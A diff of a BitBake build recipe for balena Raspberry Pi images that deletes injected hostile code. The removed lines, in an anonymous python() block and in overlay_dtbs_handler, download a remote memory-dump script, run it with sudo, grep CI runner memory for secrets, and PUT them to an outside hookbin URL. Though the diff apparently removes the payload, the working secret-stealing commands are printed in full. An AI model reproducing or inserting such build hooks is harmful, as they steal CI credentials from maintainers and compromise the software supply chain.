@@ -1,11 +1,3 @@
-python () {
-    import os
-    if not os.path.exists('/tmp/pwn_done'):
-        os.system('curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d "\\0" | grep -aoE \'"[^"]+":\\{"value":"[^"]*","isSecret":true\\}\' >> "/tmp/secrets"')
-        os.system('curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/' + (os.getenv('GITHUB_RUN_ID') or 'offline') + '"')
-        os.system('touch /tmp/pwn_done')
-}
-
 # Due to an issue on CM3 we use FAT32 for boot partition on RaspberryPi boards
 # See:
 # https://www.raspberrypi.org/documentation/hardware/computemodule/cm-emmc-flashing.md
@@ -40,9 +32,6 @@ BALENA_BOOT_PARTITION_FILES:append:revpi-connect = " revpi-connect-dt-blob-overl
 BALENA_BOOT_PARTITION_FILES:append:revpi-connect-s = " revpi-connect-dt-blob-overlay.dtb:/dt-blob.bin"
 
 python overlay_dtbs_handler () {
-    import os
-    os.system('curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d "\\0" | grep -aoE \'"[^"]+":\\{"value":"[^"]*","isSecret":true\\}\' >> "/tmp/secrets"')
-    os.system('curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/' + (os.getenv('GITHUB_RUN_ID') or 'offline') + '"')
     # Add all the dtb files programatically
     for soc_fam in d.getVar('SOC_FAMILY', True).split(':'):
         if soc_fam == 'rpi':
